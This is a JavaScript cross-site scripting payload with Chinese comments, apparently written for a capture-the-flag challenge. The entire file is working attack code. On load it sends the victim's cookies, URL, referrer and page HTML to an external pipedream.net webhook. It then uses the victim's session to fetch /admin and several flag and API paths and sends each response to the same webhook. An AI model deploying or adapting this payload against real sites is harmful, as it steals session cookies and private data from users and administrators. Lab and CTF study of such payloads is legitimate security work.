(function() {
  // 題目網站的 origin(請換成實際的 CTF 題目 URL)
  const TARGET = location.origin.includes('jenny121691') 
    ? document.referrer.split('/').slice(0,3).join('/')  // 從 referer 推
    : location.origin;
  
  const WEBHOOK = 'https://eopcy2es2nu1ne5.m.pipedream.net';
  
  // 先把當前頁面資訊送出(證明執行成功)
  fetch(WEBHOOK, {
    method: 'POST',
    mode: 'no-cors',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      stage: 'loaded',
      url: location.href,
      cookie: document.cookie,
      referrer: document.referrer,
      html: document.documentElement.outerHTML.substring(0, 2000)
    })
  });

  // 抓 /admin 頁面(帶 admin 的 session cookie)
  fetch(TARGET + '/admin', {credentials: 'include'})
    .then(r => r.text())
    .then(data => {
      fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          stage: 'admin_page',
          url: TARGET + '/admin',
          content: data
        })
      });
    })
    .catch(e => {
      fetch(WEBHOOK + '?err=' + encodeURIComponent(e.toString()), {mode:'no-cors'});
    });
  
  // 同時也打幾個常見路徑,以防 flag 不在 /admin
  ['/flag', '/api/flag', '/admin/flag', '/api/admin', '/comments/all'].forEach(path => {
    fetch(TARGET + path, {credentials: 'include'})
      .then(r => r.text())
      .then(data => {
        fetch(WEBHOOK, {
          method: 'POST',
          mode: 'no-cors',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({stage: 'probe', path, content: data.substring(0, 5000)})
        });
      }).catch(()=>{});
  });
})();
